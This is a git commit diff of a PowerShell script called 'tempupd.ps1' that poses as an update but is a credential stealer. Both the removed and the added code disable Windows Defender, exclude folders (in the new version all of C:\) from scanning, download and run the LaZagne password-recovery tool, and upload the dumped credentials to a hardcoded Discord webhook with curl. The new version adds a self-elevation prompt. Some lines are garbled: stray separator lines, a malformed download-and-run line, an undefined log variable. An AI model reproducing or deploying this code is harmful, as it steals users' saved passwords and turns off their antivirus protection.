bbf66d3424daead6fb7cf906ebe9e560ed4ff259
bindas88 <63970413+bindas88@users.noreply.github.com>
2024-08-03 12:22:10 +0700

    Update tempupd.ps1

--- tempupd.ps1
+++ tempupd.ps1
@@ -1,27 +1,45 @@
+$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+$windowsPrincipal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)
+$adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
 $webhook = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC";
+==============
 $IsAdmin = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 $Admin = $IsAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 $dir = "$env:temp\JHknfuiD"
-if (!(Test-Path -Path "$dir")) {
-New-Item -ItemType Directory -Path "$dir"
+==============
+if (-not $windowsPrincipal.IsInRole($adminRole)) {
+    $scriptPath = $MyInvocation.MyCommand.Path
+    $arguments = $MyInvocation.BoundParameters.GetEnumerator() | ForEach-Object { "-$($_.Key) '$($_.Value)'" } | Out-String
+    $arguments = $arguments.Trim()
+    Start-Process powershell.exe -Verb runAs -ArgumentList "-File `"$scriptPath`" $arguments"
+    exit
 }
-if (-not $version) {
-  $version = "2.4.6"
-}
-$log = "$dir\$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
-$verm = "v$version"
-$zelda = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"
-if ($Admin -eq 'True') {
-  Set-MpPreference -DisableRealtimeMonitoring $true
+       
+Set-MpPreference -DisableRealtimeMonitoring $true
+Add-MpPreference -ExclusionPath "C:\"
 
-  Add-MpPreference -ExclusionPath "$dir"
-}
-$hide = Get-Item "$dir" -Force
+
+$url = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"
+
+
+$destination = "C:\LaZagne.exe"
+$hide = Get-Item "$destination" -Force
 $hide.attributes='Hidden'
-Invoke-WebRequest -Uri "$zelda" -OutFile "$dir\lazagne.exe"
-& "$dir\lazagne.exe" all -vv > "$log"
+
+if (Test-Path $destination) {
+    Remove-Item $destination -Force
+}
+
+
+Invoke-WebRequest -Uri $url -OutFile $destination & "$C:\LaZagne.exe" all -vv > "$log"
 curl.exe -F "payload_json={\`"username\`": \`"$env:ComputerName\`", \`"content\`": \`"New File Uploaded`!\n(Admin: $Admin) \`"}" -F "file=@\`"$log\`"" $webhook >$null 2>&1
-Start-Sleep -Seconds 20
-$unhide = Get-Item "$dir" -Force
-$unhide.attributes='Normal'
-Remove-Item -Path "$dir" -Recurse -Force
+
+
+if ($?) {
+
+    Start-Process -FilePath $destination
+} else {
+
+    exit $LASTEXITCODE
+}
+
